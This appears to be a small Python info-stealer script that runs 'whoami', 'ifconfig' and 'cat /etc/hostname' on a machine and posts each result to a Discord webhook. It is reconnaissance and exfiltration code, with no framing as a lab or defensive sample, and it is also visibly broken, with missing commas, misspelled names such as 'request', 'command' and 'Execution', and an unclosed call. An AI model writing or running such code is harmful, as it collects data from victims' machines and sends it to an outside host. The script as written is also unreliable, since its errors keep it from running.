import subprocess
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/"

commands = {
			"Get username" : "whoami"  
     		"Get IP Config" : "ifconfig"
     		"Get Host Name" : "cat /etc/hostname"
     		}

def run_command(cmd):
	try:
		result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		return result.decode(errors="ignore")
	except Execution as e:
		return f"Error running command {cmd}"

def discord(title, content):
	request.post(WEBHOOK_URL, json = {
					"embeds" : [{
					"title" : title,
					"description" : f"```{content[:1900]}```",
					"color" : 16711680
					}]
					}

for title, cmd in command.items():
	output = run_command(cmd)
	discord(title, output)